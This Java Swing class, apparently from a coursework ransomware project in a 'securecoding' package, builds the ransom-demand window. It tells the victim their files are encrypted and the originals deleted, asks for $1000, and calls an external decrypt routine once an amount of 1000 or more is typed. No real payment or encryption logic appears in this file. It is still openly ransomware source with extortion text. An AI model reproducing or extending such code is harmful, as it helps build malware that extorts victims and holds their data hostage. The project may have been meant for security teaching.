package com.securecoding.phase3;


import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;

import java.awt.Dimension;
import java.awt.Color;
import javax.swing.JTextField;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.ImageIcon;
import javax.swing.JButton;
/**
 * 
 * @author Madhusudan Hanagal
 * @author Ganesh Rajashekharan
 * @author Ajit Paul
 *
 */
public class REDRansom {

	JFrame frmAlert;
	private JTextField PayText;

	/**
	 * Create the application.
	 */
	public REDRansom() {
		initialize();
	}

	/**
	 * Initialize the contents of the frame.
	 */
	private void initialize() {
		frmAlert = new JFrame();
		frmAlert.setForeground(Color.WHITE);
		frmAlert.getContentPane().setForeground(Color.GRAY);
		frmAlert.setMinimumSize(new Dimension(700, 500));
		frmAlert.setSize(new Dimension(700, 500));
		frmAlert.setTitle("Alert!");
		frmAlert.setBounds(100, 100, 450, 300);
		frmAlert.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frmAlert.getContentPane().setLayout(null);

		JLabel lblNewLabel = new JLabel("Warning ! Your files have been encrypted. Pay $1000 to decrypt");
		lblNewLabel.setIcon(
				new ImageIcon(REDRansom.class.getResource("/com/securecoding/phase3/1477895632_101_Warning.png")));
		lblNewLabel.setForeground(Color.RED);
		lblNewLabel.setBounds(20, 19, 548, 77);
		frmAlert.getContentPane().add(lblNewLabel);

		JLabel lblNewLabel_1 = new JLabel("Failure to pay the amount will keep the files encrypted.");
		lblNewLabel_1.setForeground(Color.RED);
		lblNewLabel_1.setIcon(
				new ImageIcon(REDRansom.class.getResource("/com/securecoding/phase3/1477895632_101_Warning.png")));
		lblNewLabel_1.setBounds(20, 108, 503, 48);
		frmAlert.getContentPane().add(lblNewLabel_1);

		PayText = new JTextField();
		PayText.setBounds(35, 259, 300, 29);
		frmAlert.getContentPane().add(PayText);
		PayText.setColumns(10);

		JButton PAYBtn = new JButton("PAY !");
		PAYBtn.setForeground(Color.BLACK);
		PAYBtn.setBounds(394, 259, 117, 29);
		frmAlert.getContentPane().add(PAYBtn);
		PAYBtn.addActionListener(new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent e) {
				try {
					if (PayText.getText().equals(""))
						JOptionPane.showMessageDialog(frmAlert, "Enter amount");
					else {
						int amount = Integer.parseInt(PayText.getText());

						if (amount < 1000) {
							JOptionPane.showMessageDialog(frmAlert, "Please pay given amount!");
						} else if (amount >= 1000) {
							RED.REDdecrypt();
							JOptionPane.showMessageDialog(frmAlert, "Your Files have been Decrypted !");
							System.exit(0);
						}
					}
				} catch (Exception exp) {
					JOptionPane.showMessageDialog(frmAlert, "Your Files have been Decrypted !");
				}

			}
		});
		JLabel lblNewLabel_2 = new JLabel(
				"Note: Closing of this window will cause no effect on encrypted files. All original files have been deleted");
		lblNewLabel_2.setBounds(20, 336, 661, 29);
		frmAlert.getContentPane().add(lblNewLabel_2);
	}
}
